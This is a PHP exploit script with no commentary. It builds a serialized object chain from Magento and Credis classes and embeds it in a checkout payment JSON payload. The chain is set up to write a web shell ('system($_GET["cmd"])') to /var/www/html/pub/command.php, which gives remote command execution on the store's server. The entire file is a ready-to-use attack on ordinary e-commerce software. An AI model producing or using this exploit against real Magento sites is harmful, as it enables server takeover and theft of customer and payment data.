<?php

class Magento_Framework_Simplexml_Config_Cache_File extends DataObject
{
    function __construct($data){
        $this->_data = $data;
    }
}

class Credis_Client{
    const TYPE_STRING      = 'string';
    const TYPE_LIST        = 'list';
    const TYPE_SET         = 'set';
    const TYPE_ZSET        = 'zset';
    const TYPE_HASH        = 'hash';
    const TYPE_NONE        = 'none';
    const FREAD_BLOCK_SIZE = 8192;

    protected $redis;
    
    protected $redisMulti;

    protected $host;

    protected $port;

    protected $timeout;

    protected $readTimeout;

    protected $persistent;

    protected $closeOnDestruct = TRUE;

    protected $connected = TRUE;

    protected $standalone;

    protected $maxConnectRetries = 0;

    protected $connectFailures = 0;

    protected $usePipeline = FALSE;

    protected $commandNames;

    protected $commands;

    protected $isMulti = FALSE;

    protected $isWatching = FALSE;

    protected $authPassword;

    protected $selectedDb = 0;

    protected $wrapperMethods = array('delete' => 'del', 'getkeys' => 'keys', 'sremove' => 'srem');

    protected $renamedCommands;

    protected $requests = 0;


    public function __construct($resource) {
        $this->redis = new Magento_Sales_Model_Order_Payment_Transaction($resource);
    }
}

class DataObject
{
    protected $_data = [];

    protected static $_underscoreCache = [];
}

abstract class AbstractModel extends DataObject
{
    protected $_eventPrefix = 'core_abstract';

    protected $_eventObject = 'object';

    protected $_idFieldName = 'id';

    protected $_hasDataChanges = false;

    protected $_origData;

    protected $_isDeleted = false;

    protected $_resource;

    protected $_resourceCollection;

    protected $_resourceName;

    protected $_collectionName;

    protected $_cacheTag = false;

    protected $_dataSaveAllowed = true;

    protected $_eventManager;

    protected $_cacheManager;

    protected $_registry;

    protected $_logger;

    protected $_appState;

    protected $_actionValidator;

    protected $storedData = [];
}

class Magento_Sales_Model_Order_Payment_Transaction extends AbstractModel
{
    const TYPE_PAYMENT = 'payment';

    const TYPE_ORDER = 'order';

    const TYPE_AUTH = 'authorization';

    const TYPE_CAPTURE = 'capture';

    const TYPE_VOID = 'void';

    const TYPE_REFUND = 'refund';

    const RAW_DETAILS = 'raw_details_info';

    protected $_transactionsAutoLinking = true;

    protected $_isFailsafe = true;

    protected $_eventPrefix = 'sales_order_payment_transaction';

    protected $_eventObject = 'order_payment_transaction';

    protected $_orderFactory;

    protected $_dateFactory;

    protected $_transactionFactory;

    protected $orderPaymentRepository;

    protected $orderRepository;

    public function __construct($resource) {
        $this->_resource = $resource;
    }
}

$data = [];
$data['is_allowed_to_save'] = True;
$data['stat_file_name'] = '/var/www/html/pub/command.php';
$data['components'] = '<?php system($_GET["cmd"]); ?>';
$resource = new Magento_Framework_Simplexml_Config_Cache_File($data);

$redis = new Credis_Client($resource);
$serialized = serialize($redis);
// echo $serialized;
// echo "\n";
$payload = json_decode('{"paymentMethod":{"method":"checkmo", "additional_data":{"additional_information":""}}, "email": "valid@magento.com"}');

$payload->paymentMethod->additional_data->additional_information = str_replace('Magento_Sales_Model_Order_Payment_Transaction', 'Magento\\Sales\\Model\\Order\\Payment\\Transaction', str_replace('Magento_Framework_Simplexml_Config_Cache_File', 'Magento\\Framework\\Simplexml\\Config\\Cache\\File', $serialized));

echo json_encode($payload);
echo "\n";
?>
